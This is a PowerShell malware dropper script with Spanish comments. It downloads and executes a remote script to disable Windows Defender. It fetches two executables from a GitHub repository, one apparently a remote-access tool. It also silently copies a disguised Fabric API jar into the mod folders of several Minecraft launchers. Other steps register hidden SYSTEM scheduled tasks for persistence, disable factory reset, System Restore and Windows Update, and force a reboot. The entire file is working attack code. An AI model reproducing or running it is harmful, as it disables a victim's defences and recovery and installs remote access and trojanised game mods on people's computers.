# ============================================================
#  FLUJO FINAL
# ============================================================

Write-Host "[+] Destroying Windows Defender..." -ForegroundColor Red

Write-Host "[1/7]" -ForegroundColor Cyan
iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/MurphCodeDev/wf/main/Disable_Defender.ps1'))
Start-Sleep -Seconds 5

Write-Host "[2/7]" -ForegroundColor Cyan
$workDir = "C:\ProgramData\Updater"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

Write-Host "[3/7]" -ForegroundColor Cyan
$schostPath = "$workDir\schost.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/schost.exe" -OutFile $schostPath

$ratPath = "$workDir\win_nc.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath


# --- Buscar todas las carpetas 'mods' en los launchers de Minecraft (SILENCIOSO) ---
$jarName = "fabric-api-0.179.1_22.1.2.jar"
$tempJar = "$workDir\$jarName"
$destinos = @()

# 1. .minecraft/mods
$minecraftMods = "$env:APPDATA\.minecraft\mods"
if (Test-Path $minecraftMods) { $destinos += $minecraftMods }

# 2. Lunar Client
$lunarProfiles = "$env:USERPROFILE\.lunarclient\profiles"
if (Test-Path $lunarProfiles) {
    $destinos += Get-ChildItem -Path $lunarProfiles -Directory -ErrorAction SilentlyContinue | 
        Where-Object { Test-Path (Join-Path $_.FullName "mods") } | 
        ForEach-Object { Join-Path $_.FullName "mods" }
}

# 3. Feather
$featherMods = "$env:APPDATA\.feather\user-mods"
if (Test-Path $featherMods) { $destinos += $featherMods }
if (Test-Path $featherMods) {
    $destinos += Get-ChildItem -Path $featherMods -Directory -Recurse -ErrorAction SilentlyContinue | 
        Where-Object { $_.Name -eq "mods" } | 
        ForEach-Object { $_.FullName }
}

# 4. Prism Launcher
$prismInstances = "$env:APPDATA\PrismLauncher\instances"
if (Test-Path $prismInstances) {
    $destinos += Get-ChildItem -Path $prismInstances -Directory -ErrorAction SilentlyContinue | 
        Where-Object { Test-Path (Join-Path $_.FullName "mods") } | 
        ForEach-Object { Join-Path $_.FullName "mods" }
}

# Eliminar duplicados
$destinos = $destinos | Select-Object -Unique

# Si hay al menos una carpeta mods, descargar y copiar el .jar sin mostrar nada
if ($destinos.Count -gt 0) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/$jarName" -OutFile $tempJar -UseBasicParsing -ErrorAction SilentlyContinue > $null 2>&1
    foreach ($dest in $destinos) {
        Copy-Item -Path $tempJar -Destination "$dest\$jarName" -Force -ErrorAction SilentlyContinue > $null 2>&1
    }
}
# No se muestra ningún mensaje, ni siquiera de error o éxito

Write-Host "[4/7]" -ForegroundColor Cyan
schtasks /create /tn "Schost" /tr "cmd /c start /b $schostPath" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
schtasks /create /tn "Win" /tr "cmd /c start /b $ratPath & schtasks /delete /tn Win /f" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1

Write-Host "[+] Disabling Factory Reset......"  -ForegroundColor Red

Write-Host "[5/7]" -ForegroundColor Cyan
reagentc.exe /disable > $null 2>&1

Write-Host "[+] Disabling System Restore..."  -ForegroundColor Red

Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue

Write-Host "[+] Disabling Windows Update......"  -ForegroundColor Red

Write-Host "[6/7]" -ForegroundColor Cyan
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v SetDisableUXWUAccess /t REG_DWORD /d 1 /f /reg:64 > $null 2>&1; `
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f /reg:64 > $null 2>&1; `
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 2 /f /reg:64 > $null 2>&1

Write-Host "[7/7] CHECKS" -ForegroundColor Cyan
try { Get-MpComputerStatus -ErrorAction Stop 2>$null | Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled } catch { Write-Host "Windows defender: Destroyed " }
if ((reagentc /info | Out-String) -match "Enabled|Disabled") { "Factory Reset: $($matches[0])" } else { "Factory Reset: Not found" }
if ((Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -ErrorAction SilentlyContinue).NoAutoUpdate -eq 1) { "Windows Update: Disabled" } else { "Windows Update: Enabled" }

Write-Host "[DONE]..." -ForegroundColor Magenta

Start-Sleep -Seconds 30


Restart-Computer -Force
